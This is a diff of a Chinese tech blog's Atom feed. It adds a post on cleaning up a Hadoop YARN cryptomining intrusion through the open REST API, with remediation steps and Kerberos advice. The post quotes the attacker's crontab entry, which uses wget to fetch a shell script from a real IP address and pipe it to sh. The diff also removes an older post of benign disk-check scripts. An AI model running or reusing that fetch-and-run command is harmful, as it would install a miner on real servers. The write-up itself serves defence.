@@ -1,4 +1,60 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://firsh.me/" rel="alternate" type="text/html" /><updated>2018-06-15T09:28:40+08:00</updated><id>http://firsh.me/</id><title type="html">张建新</title><subtitle>Flink，张建新技术博客，Kubernetes技术，虚拟化技术，微服务，容器技术,docker,Github, Google Kubernetes, kubernetes, Flink,Graphx,Spark,docker。</subtitle><author><name>unknow :)</name></author><entry><title type="html">Ant-Design-Pro 基础问题[第四天]</title><link href="http://firsh.me/2018/05/30/ant-design-pro-stack2/" rel="alternate" type="text/html" title="Ant-Design-Pro 基础问题[第四天]" /><published>2018-05-30T11:09:03+08:00</published><updated>2018-05-30T11:09:03+08:00</updated><id>http://firsh.me/2018/05/30/ant-design-pro-stack2</id><content type="html" xml:base="http://firsh.me/2018/05/30/ant-design-pro-stack2/">&lt;p&gt;其中是我在QQ群 &lt;code class=&quot;highlighter-rouge&quot;&gt;362329545&lt;/code&gt;遇到的 问题，整理成问答录，希望能解决入门的烦恼，个人见解，如果有那里有错误请指出了我会积极改进，方便他人。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="http://firsh.me/" rel="alternate" type="text/html" /><updated>2018-06-22T01:17:04+08:00</updated><id>http://firsh.me/</id><title type="html">张建新</title><subtitle>Flink，张建新技术博客，Kubernetes技术，虚拟化技术，微服务，容器技术,docker,Github, Google Kubernetes, kubernetes, Flink,Graphx,Spark,docker。</subtitle><author><name>unknow :)</name></author><entry><title type="html">yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application</title><link href="http://firsh.me/2018/06/21/yarn-hack-hadoop/" rel="alternate" type="text/html" title="yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application" /><published>2018-06-21T17:48:51+08:00</published><updated>2018-06-21T17:48:51+08:00</updated><id>http://firsh.me/2018/06/21/yarn-hack-hadoop</id><content type="html" xml:base="http://firsh.me/2018/06/21/yarn-hack-hadoop/">&lt;p&gt;简单介绍一下过程，现在有些人通过 hadoop 开放的restApi进行挖矿，8088 以及 8090 端口。&lt;/p&gt;
+
+&lt;h3 id=&quot;排问题&quot;&gt;排问题&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;1. 集群检查&lt;/p&gt;
+
+    &lt;p&gt;今天检查Hadoop 服务器发现Yarn上面的job莫名其妙的变多了，而且一直再跑。
+&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/7422da30-8014-41f6-a922-55f86a3ce252.png&quot; alt=&quot;&quot; /&gt;
+经过排查在&lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/ /var/tmp&lt;/code&gt; 下面发现了 Java 还有tmp.txt
+内容如下：
+&lt;img src=&quot;http://zmatsh.b0.upaiyun.com/demos/63c45ec8-bcbd-4fbd-98bb-ee624eb4ea70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;服务器地址:&lt;code class=&quot;highlighter-rouge&quot;&gt;transfer.sh&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;ol&gt;
+      &lt;li&gt;检查 &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab -l &lt;/code&gt; 发现了一个莫名其妙的 job
+        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; wget -q -O - http://185.222.210.59/cr.sh | sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;解决办法&quot;&gt;解决办法&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;1，通过查看占用cpu高得进程，kill掉此进程&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;2，检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;3 ，通过crontab -l 查看有一个* * * * * wget -q -O - http://185.222.210.59/cr.sh&lt;/td&gt;
+          &lt;td&gt;sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1任务，删除此任务&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;4，排查YARN日志，确认异常的application，删除处理&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;5 再通过top验证看是否还有高cpu进程，如果有，kill掉，没有的话应该正常了。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;6 注意：YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的，因此注意并启用Kerberos认证功能，禁止匿名访问修改8088端口&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;感谢老铁登科&quot;&gt;感谢老铁登科&lt;/h4&gt;
+
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">简单介绍一下过程，现在有些人通过 hadoop 开放的restApi进行挖矿，8088 以及 8090 端口。</summary></entry><entry><title type="html">Ant-Design-Pro 基础问题[第四天]</title><link href="http://firsh.me/2018/05/30/ant-design-pro-stack2/" rel="alternate" type="text/html" title="Ant-Design-Pro 基础问题[第四天]" /><published>2018-05-30T11:09:03+08:00</published><updated>2018-05-30T11:09:03+08:00</updated><id>http://firsh.me/2018/05/30/ant-design-pro-stack2</id><content type="html" xml:base="http://firsh.me/2018/05/30/ant-design-pro-stack2/">&lt;p&gt;其中是我在QQ群 &lt;code class=&quot;highlighter-rouge&quot;&gt;362329545&lt;/code&gt;遇到的 问题，整理成问答录，希望能解决入门的烦恼，个人见解，如果有那里有错误请指出了我会积极改进，方便他人。&lt;/p&gt;
 
 &lt;h2 id=&quot;问答录3问&quot;&gt;问答录[3问]&lt;/h2&gt;
 
@@ -1835,74 +1891,4 @@ brew install privoxy
 
 &lt;h3 id=&quot;原文httpsblogcsdnnetyiyefangzhou24articledetails6440239&quot;&gt;原文：https://blog.csdn.net/yiyefangzhou24/article/details/6440239&lt;/h3&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">前言</summary></entry><entry><title type="html">linux硬盘检查大小awk脚本全自动执行,以及日志抽取</title><link href="http://firsh.me/2018/04/04/check-disk-manager/" rel="alternate" type="text/html" title="linux硬盘检查大小awk脚本全自动执行,以及日志抽取" /><published>2018-04-04T17:08:52+08:00</published><updated>2018-04-04T17:08:52+08:00</updated><id>http://firsh.me/2018/04/04/check-disk-manager</id><content type="html" xml:base="http://firsh.me/2018/04/04/check-disk-manager/">&lt;h2 id=&quot;disk-监测剩余量&quot;&gt;DISK 监测剩余量&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0
-&lt;span class=&quot;nv&quot;&gt;DISK_SIZE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0
-&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0..26&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;do
-    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;dscn0&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Disk&quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;剩余可用大小GB&quot;&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;ssh dscn0&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; df -m|grep hadoop | awk &lt;span class=&quot;s1&quot;&gt;'$4~/^[0-9]/ {split($4,array,&quot;[A-Z]&quot;);b+=array[1]} END {print b/1024}'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;DISK_SIZE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DISK_SIZE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; + &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$temp&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | bc&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;总数 剩余 占比 目录&quot;&lt;/span&gt;
-    ssh dscn0&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; df -h | grep hadoop  | awk &lt;span class=&quot;s1&quot;&gt;'{print$2, $4, $5, $6}'&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;done
-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[32m 剩余总大小: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DISK_SIZE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; GB &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;h2 id=&quot;bash-样式&quot;&gt;bash 样式&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-    &lt;span class=&quot;nv&quot;&gt;PS1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\[\e[1;32m\]\u@\h\[\e[m\]:\[\e[1;34m\]\W\[\e[1;33m\]\$\[\e[m\] '&lt;/span&gt;
-    
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;抽取一天的日志到另一个日志文件&quot;&gt;抽取一天的日志到另一个日志文件&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;TIME_LINE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;date +%Y%m%d%H%M%S&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
-
-
-&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;getOne&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;# 设定变量&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -z &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;;&lt;span class=&quot;k&quot;&gt;then
-        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[31m Error: log Name is Null  &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[32m Simple : ./readlogs.sh getOne xxx.log  &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
-    &lt;span class=&quot;k&quot;&gt;fi
-    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;date -d yesterday +%F&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#前一天&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;#s=$(date +%F) #今天&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;date +%F&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#今天&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;# 根据条件获得开始和结束的行号&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;sl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;cat -n &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt; | grep &lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt; | head -1 | sed &lt;span class=&quot;s1&quot;&gt;'s/^[ \t]*//g'&lt;/span&gt; | cut -f 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;el&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;cat -n &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt; | grep &lt;span class=&quot;nv&quot;&gt;$e&lt;/span&gt; | tail -1 | sed &lt;span class=&quot;s1&quot;&gt;'s/^[ \t]*//g'&lt;/span&gt; | cut -f 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[32m start Line &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sl&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[32m end Line &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$el&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;# 获取结果并输出到 `date`.log 文件&lt;/span&gt;
-    sed -n &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sl&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$el&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'p'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt; &amp;gt;&amp;gt; check_auto_&lt;span class=&quot;nv&quot;&gt;$TIME_LINE&lt;/span&gt;.log
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;
-
-&lt;span class=&quot;s2&quot;&gt;&quot;getOne&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	getOne &lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m usage: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  [getOne] &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m DESC: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; getOne : 获得一天内的文件日志，并且进行导出。 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;2 &lt;span class=&quot;c&quot;&gt;# Command to come out of the program with status 1&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">DISK 监测剩余量</summary></entry></feed>
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>unknow :)</name></author><summary type="html">前言</summary></entry></feed>
